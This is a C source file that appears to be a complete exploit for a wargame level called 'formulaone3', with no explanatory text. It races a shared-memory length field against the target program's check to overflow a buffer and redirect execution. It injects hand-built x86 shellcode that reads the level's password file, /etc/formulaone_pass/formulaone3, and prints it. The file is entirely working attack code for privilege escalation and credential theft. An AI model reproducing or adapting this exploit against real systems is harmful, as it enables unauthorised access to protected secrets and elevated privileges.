#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <signal.h>
struct msg { int sz; char ptr[1024]; };
int main(int argc, char **argv) {
    unsigned int shmkey = strtoul(argv[1], 0, 0);
    unsigned int shmaddr = strtoul(argv[2], 0, 0);
    int sc_off = 0x200;
    int shmid = shmget(shmkey, 8192, IPC_CREAT | 0777);
    if (shmid < 0) { perror("shmget"); return 1; }
    struct msg *m = shmat(shmid, NULL, 0);
    if (m == (void*)-1) { perror("shmat"); return 1; }
    memset(m->ptr, 'A', 1024);
    *(unsigned int *)(m->ptr + 0x110) = shmaddr + sc_off;
    {   /* shellcode: open/read/write /etc/formulaone_pass/formulaone3 -> fd 1 */
        char *path = "/etc/formulaone_pass/formulaone3";
        int len = strlen(path), off = 0;
        m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xC0;
        m->ptr[sc_off + off++] = 0x50;
        for (int c = len - 4; c >= 0; c -= 4) {
            m->ptr[sc_off + off++] = 0x68;
            for (int k = 0; k < 4; k++)
                m->ptr[sc_off + off++] =
                    (c + k < len) ? path[c + k] : 0;
        }
        m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xE3;
        m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xC9;
        m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x05;
        m->ptr[sc_off + off++] = 0xCD; m->ptr[sc_off + off++] = 0x80;
        m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xC3;
        m->ptr[sc_off + off++] = 0x83; m->ptr[sc_off + off++] = 0xEC;
        m->ptr[sc_off + off++] = 0x40;
        m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xE1;
        m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xD2;
        m->ptr[sc_off + off++] = 0xB2; m->ptr[sc_off + off++] = 0x21;
        m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x03;
        m->ptr[sc_off + off++] = 0xCD; m->ptr[sc_off + off++] = 0x80;
        m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xDB;
        m->ptr[sc_off + off++] = 0xB3; m->ptr[sc_off + off++] = 0x01;
        m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xE1;
        m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xC2;
        m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x04;
        m->ptr[sc_off + off++] = 0xCD; m->ptr[sc_off + off++] = 0x80;
        m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xDB;
        m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x01;
        m->ptr[sc_off + off++] = 0xCD; m->ptr[sc_off + off++] = 0x80;
    }
    pid_t t = fork();
    if (t == 0) { while (1) { m->sz = 10; m->sz = 0x400; } }
    for (int round = 0; round < 400; round++) {
        pid_t p = fork();
        if (p == 0) {
            execl("/formulaone/formulaone3", "formulaone3", "a", (char*)0);
            _exit(127);
        }
        waitpid(p, NULL, 0);
    }
    kill(t, SIGKILL);
    return 0;
}

